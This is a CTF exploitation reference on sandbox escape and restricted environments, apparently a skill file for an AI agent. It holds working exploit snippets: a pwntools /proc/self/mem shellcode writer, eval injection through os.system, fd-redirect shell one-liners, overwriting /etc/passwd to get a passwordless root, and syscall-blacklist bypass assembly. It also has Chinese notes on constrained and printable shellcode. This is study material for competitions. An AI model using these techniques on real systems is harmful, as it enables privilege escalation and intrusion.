# CTF Pwn - Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)
- [Write-Anywhere via /proc/self/mem (BSidesSF 2025)](#write-anywhere-via-procselfmem-bsidessf-2025)
- [process_vm_readv Failure as Sandbox Escape (0CTF 2016)](#process_vm_readv-failure-as-sandbox-escape-0ctf-2016)
- [Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)](#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016)
- [Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)](#lua-integer-underflow-via-game-logic-asis-ctf-finals-2017)
- [CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)](#cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018)
- [Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)](#unicorn-emulator-syscall-blacklist-bypass-via-sysenter-and-uncommon-syscalls-meepwn-ctf-quals-2018)
- [Custom VM swap Pointer Self-Overwrite (HITCON 2018)](#custom-vm-swap-pointer-self-overwrite-hitcon-2018)

---

## Python Sandbox Escape

Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in the `ctf-misc` skill — invoke `/ctf-misc` for pyjail techniques.

## VM Exploitation (Custom Bytecode)

**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Key insight:** FUSE/CUSE devices run handler code in userspace with the permissions of the device daemon. If the daemon runs as root and exposes a command interface via the write handler, any user who can write to the device file gains root-level operations (chmod, file read/write).

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

**Key insight:** In restricted environments without sudo, look for custom character devices (`/dev/backdoor`) or writable system files. Any write primitive to `/etc/passwd` (remove root's password hash) or `/etc/sudoers` (add NOPASSWD entry) gives root.

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

**Key insight:** Network servers typically have the client socket on fd 3. Redirecting stdin/stdout to this fd (`exec <&3; sh >&3 2>&3`) gives an interactive shell over the existing connection without needing outbound connectivity for a reverse shell.

---

## Write-Anywhere via /proc/self/mem (BSidesSF 2025)

When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection:

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap -- the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`.

**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.

---

### process_vm_readv Failure as Sandbox Escape (0CTF 2016)

**Pattern:** Sandbox validates file paths by calling `process_vm_readv()` then `realpath()`. By mapping memory with `PROT_READ` only (not remotely readable by `process_vm_readv` from the sandbox process), path validation fails silently, bypassing the check.

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there -- sandbox's process_vm_readv fails
// realpath() also fails -- path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**Key insight:** Sandbox path validation using `process_vm_readv` assumes validation will succeed or deny. The failure case (unreadable memory) is unhandled, creating a bypass. The sandboxed process can read its own memory normally, but the supervisor process cannot read it via `process_vm_readv`.

**References:** 0CTF 2016

---

### Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)

**Pattern:** Binary reads a file and checks its size before processing. Named pipes (FIFOs) report `st_size = 0` via `stat()` but deliver arbitrary data when read, bypassing size-based overflow prevention.

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data
./vulnerable_binary /tmp/payload_pipe
```

Combine with symlinks for string reuse: `ln -s /flag arena.c` uses an existing string in the binary as the target filename for a ROP chain.

**Key insight:** Named pipes always report `st_size = 0` in `stat()`, bypassing any size-based buffer allocation or bounds checks while delivering arbitrary-length data via `read()`. Any binary that uses `stat()` to pre-allocate or validate before `read()` is vulnerable.

**References:** Nuit du Hack 2016

---

### Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)

**Pattern:** Text-based game (written in Lua) with inventory management. Two independent percentage reductions are applied sequentially to the same value without capping the combined result: a 100% decay applied first zeros the inventory, then a 10% penalty applied to the already-zero value causes an integer underflow below zero. Selling the underflowed items generates unlimited money (the game treats a large negative count as a large positive sale value or wraps to unsigned max).

**Vulnerable logic:**
```lua
-- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed

-- If applied in the other order, or combined:
-- 100% decay → inventory = 0
-- 10% of 0 = 0 → total reduction = 100%, no underflow

-- But with uncapped sequential application:
-- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
-- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
-- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**Exploitation:**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**Key insight:** Business logic bugs in game economies create integer underflows without any memory corruption — two uncapped percentage reductions exceeding 100% underflow the target variable. Look for any game mechanic that applies multiple independent percentage modifications to the same integer value in the same tick.

**References:** ASIS CTF Finals 2017

---

### CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)

**Pattern:** Custom CPU emulator's print function uses `eval('"' + string_buffer + '"')` to process escape sequences in the output. Build a string in emulator memory character-by-character using ADD opcodes, then inject: `"+__import__("os").system("cmd")#` to escape the string literal and execute arbitrary Python.

**Exploitation strategy:**
1. The emulator implements a custom instruction set with ADD, MOV, PRINT, etc.
2. The PRINT opcode reads a string from emulator memory and passes it to `eval('"' + s + '"')` to handle escape sequences like `\n`, `\t`
3. Use ADD opcodes to build the injection string character-by-character in emulator memory
4. The injected string `"+__import__("os").system("cmd")#` closes the opening quote, concatenates with `__import__("os").system()`, and `#` comments out the trailing quote

```python
from pwn import *

# Emulator opcodes (example encoding)
ADD = 0x01   # ADD addr, immediate_byte
PRINT = 0x58  # Print string from memory (triggers eval)

def build_char(c):
    """Generate ADD opcodes to set a memory byte to character c"""
    addr = current_mem_ptr()
    return bytes([ADD, addr, ord(c)])

# Build injection payload in emulator memory
cmd = "cat /flag"
injection = '''"+__import__("os").system("%s")#''' % cmd

program = b""
for c in injection:
    program += build_char(c)

# Trigger PRINT opcode -> eval('"' + injection + '"')
# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
# The # comments out the trailing quote
program += bytes([PRINT, 0x00])  # PRINT from address 0

io = remote('target', 1337)
io.send(program)
io.interactive()
```

**Key insight:** When an emulator or interpreter uses `eval()` to process string output (e.g., for escape sequences), inject a quote to close the string literal, then chain arbitrary Python code. The `#` comment character truncates any trailing syntax. This is a classic eval injection -- the emulator trusts its own memory contents, but the attacker controls memory via normal CPU opcodes.

**References:** Midnight Sun CTF 2018

---

### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)

**Pattern:** A Unicorn-based shellcode runner hooks `UC_HOOK_INSN` for `int 0x80` and `UC_HOOK_MEM_*` to block forbidden syscall numbers (execve, read, write, mmap). The filter only covers the `int 0x80` entry and the handful of syscalls the authors thought of.

**Bypass:**
1. Use `sysenter` instead of `int 0x80` — Unicorn's `INT` hook does not fire on the fast entry path.
2. Use functionally equivalent syscalls that are not on the blacklist:
   - `dup3` instead of `dup2`
   - `openat` instead of `open`
   - `pread64` instead of `read`
   - `sendfile` to move a file descriptor's contents straight to another fd without touching `write`
3. Stage the payload so the final stage is `execve("/bin/sh", ...)` via `sys_socketcall` (opcode `0x66`) + crafted syscall-mode transition, if even `execve` is in the blacklist.

```asm
; Swap file from /flag to stdout without read/write
mov eax, 0x123            ; __NR_openat
mov ebx, -100             ; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter                  ; NOT int 0x80 — bypasses Unicorn INT hook

; fd is now in eax
mov ebx, eax              ; src fd
mov ecx, 1                ; dst fd (stdout)
xor edx, edx              ; NULL offset
mov esi, 0x1000           ; count
mov eax, 0xbb             ; __NR_sendfile
sysenter
```

**Key insight:** Instruction-level filters in Unicorn hook specific opcodes. If the filter only watches `int 0x80`, any other syscall entry (`sysenter`, `syscall`, `int 0x2e` on x86-32 test builds) slips through. Always enumerate functionally equivalent syscalls: `dup3/openat/pread64/sendfile/writev/mmap2` cover almost everything a blacklist of `execve/read/write/mmap` forgets.

**References:** Meepwn CTF Quals 2018 — writeups 10415, 10428

---

## Custom VM swap Pointer Self-Overwrite (HITCON 2018)

**Pattern:** A custom VM exposes a `swap(a, b)` instruction that reads two stack indices relative to the saved `sp`. If the VM never validates that `sp_nxt` is within bounds, calling `swap(-1, 0)` or `swap(-2, -1)` addresses the internal `sp_nxt` itself and exchanges it with a stack slot. Subsequent instructions then operate on arbitrary memory.

```text
swap(-1, 0)     # treats &sp_nxt as stack[-1]; swaps sp_nxt <-> stack[0]
# sp_nxt now points wherever stack[0] used to; writes go anywhere
```

Chain with a `push` that stores shellcode bytes at the new pointer, then redirect a function pointer from the VM's dispatch table to the shellcode region.

**Key insight:** Any VM primitive that rewrites its own state pointer is an immediate arbitrary-write primitive. Always probe VM opcodes for boundary conditions where the stack pointer itself is addressable.

**References:** HITCON CTF 2018 — Abyss I, writeups 11918-11919

---

## [来自实战] somebox — 受限shellcode：三字节游戏校验（2025强网杯决赛）

**技术模式**: 每连续三字节权值之和 < 5（权值 = byte % 5），全寄存器清零，须先mmap获取可写内存，openat+sendfile读flag。

**游戏约束验证**:
```python
for i in range(len(shellcode) - 2):
    s = sum(shellcode[i+j] % 5 for j in range(3))
    if s >= 5:
        print("error"); quit()
```

**低权值指令清单**（优先选这些）:
- `jmp $+2`  → `EB 00`，权值 0+0=0
- `mov ecx, imm` → `B9 xx xx xx xx`，权值 0+各字节%5
- `xchg r1,r2` / `xchg r2,r1` 效果等价，可选权值更低的写法
- 避免 `mov [reg], reg` 类指令（操作码权值高）

**关键操作**:
1. 全寄存器清零 → 无可写地址，第一步必须 `mmap(随机地址, 0x1000, PROT_RWX, MAP_ANON|MAP_PRIVATE)` 拿可写页
2. 把栈迁移到mmap区域：`xchg rbx,rsp`
3. 逐字节写 `/flag\x00` 字符串到mmap区（用 `mov ecx,'/'` + `mov [rbx],cl` + `inc rbx`）
4. `openat(AT_FDCWD, mmap_addr, O_RDONLY)` → `sendfile(stdout_fd, file_fd, NULL, 0x30)`
5. 沙箱白名单：openat已加白；被ban的读取方式：mmap/read/readv/pread64/preadv/splice/sendfile(需确认)/io_uring

**适用场景**: 下次遇到"shellcode字节值有数学约束+全寄存器清零+沙箱ban read"时，优先考虑低权值指令集+mmap建内存+openat+sendfile链路

---

## [来自实战] login — isprint过滤 + alphanumeric shellcode（长城杯2022）

**技术模式**: mmap分配RWX内存 + isprint()字节过滤 → 只能写可打印ASCII shellcode；先置权限位再写shellcode。

**关键操作**:
1. 程序选项2：mmap申请RWX内存并执行写入的内容，但每字节有`isprint()`检查（只允许0x20-0x7E）
2. 选项2有额外check标志位，选项1发送`msg:ro0t`将其置1，再走选项2
3. 使用现成alphanumeric shellcode（如CSDN Y_peak文章中的Rh0666TY...格式），编码为全可打印ASCII
4. exp：`sendline('opt:1\r\nmsg:ro0t\r\n')` → `sendline(b'opt:2\r\nmsg:' + alphanumeric_code + b'\r\n')`

**适用场景**: 遇到isprint/isalnum/isalpha过滤shellcode时，直接查alphanumeric shellcode资源库（x64/x86分别有现成版本），无需手写；注意先满足其他权限前置条件
